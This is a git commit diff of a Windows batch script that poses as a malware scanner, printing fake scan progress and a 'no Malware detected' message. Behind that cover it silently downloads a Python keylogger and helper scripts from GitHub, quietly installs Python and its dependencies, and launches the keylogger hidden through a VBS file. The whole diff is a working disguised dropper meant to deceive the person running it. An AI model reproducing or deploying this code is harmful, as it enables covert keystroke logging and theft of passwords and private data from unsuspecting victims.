7da2a548ae4e290de4c230dc1f06a31e2a75909a
Raikster <82277474+Raikster@users.noreply.github.com>
2021-08-28 23:47:03 +0200

    Update Download_skript.bat

--- Download_skript.bat
+++ Download_skript.bat
@@ -1,11 +1,19 @@
 @echo off
+echo Scanning your computer for malware, please stand by...
 if not exist "%UserProfile%\.keylogger" mkdir "%UserProfile%\.keylog"
 cd %UserProfile%\.keylog
-curl "https://github.com/Raikster/keylogger_python/blob/main/keylogger.py" --output keylogger.py
-curl "https://github.com/Raikster/keylogger_python/keylogger_start.bat" --output keylogger_start.bat
-curl "https://github.com/Raikster/keylogger_python/testhide.vbs" --output testhide.vbs
-curl "https://github.com/Raikster/keylogger_python/requirements.txt" --output requirements.txt
-curl "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe" --output python396.exe
-start /wait python396.exe /quiet InstallAllUsers=0 Include_launcher=0 Include_pip=1 Include_test=0
+curl -sOL "https://raw.githubusercontent.com/Raikster/keylogger_python/main/keylogger.py" --output keylogger.py
+curl -sOL "https://raw.githubusercontent.com/Raikster/keylogger_python/main/keylogger_start.bat" --output keylogger_start.bat
+curl -sOL "https://raw.githubusercontent.com/Raikster/keylogger_python/main/testhide.vbs" --output testhide.vbs
+curl -sOL "https://raw.githubusercontent.com/Raikster/keylogger_python/main/requirements.txt" --output requirements.txt
+echo 25% done...
+curl -s "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe" --output python396.exe
+echo 50% done...
+start /wait python396.exe /quiet InstallAllUsers=0 Include_launcher=0 Include_pip=1 Include_test=0 Shortcuts=0
+%UserProfile%\appdata\local\programs\python\python39\python.exe -m pip install --upgrade pip --no-warn-script-location --quiet
+echo 75% done...
 cd %UserProfile%\AppData\Local\Programs\Python\Python39\Scripts
-pip.exe install -r requirements.txt
+pip.exe install -r %UserProfile%\.keylog\requirements.txt --no-warn-script-location --quiet
+cd %UserProfile%\.keylog
+testhide.vbs
+echo finished, no Malware detected ...
